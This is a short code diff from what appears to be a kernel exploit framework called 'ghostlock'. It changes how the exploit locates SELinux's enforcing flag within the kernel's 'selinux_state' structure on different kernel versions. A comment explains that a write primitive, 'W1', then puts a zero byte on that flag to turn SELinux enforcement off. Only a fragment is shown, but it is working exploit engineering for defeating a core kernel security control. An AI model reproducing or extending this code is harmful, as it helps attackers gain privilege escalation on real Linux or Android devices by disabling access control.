@@ -48,10 +48,17 @@ namespace ghostlock::profile {
             ghostlock::kernel::ROOT_TASK_GROUP_OFF);
     }
 
+    /* W1's target: the enforcing field, not the struct base. The profile's
+     * `selinux.enforcing` is the field's byte inside `selinux_state` (0 on
+     * 5.10/6.x; 1 on the 5.4 family, whose unconditional `disabled` byte
+     * shifts it). A profile without the block resolves through the release
+     * fallback in TargetProfile::selinux_enforcing_offset(). The page path and
+     * page-free share this target; W1's value byte 0 then lands on enforcing. */
     inline uintptr_t selinux_enforcing() {
         return symbol_image(
-            [](const kernel_offsets &v) { return v.offsets.selinux_enforcing; },
-            ghostlock::kernel::SELINUX_ENFORCING_OFF);
+                   [](const kernel_offsets &v) { return v.offsets.selinux_enforcing; },
+                   ghostlock::kernel::SELINUX_ENFORCING_OFF) +
+               ghostlock::session::g_exploit_session.profile.selinux_enforcing_offset();
     }
 
     inline uintptr_t selinux_blob_sizes() {
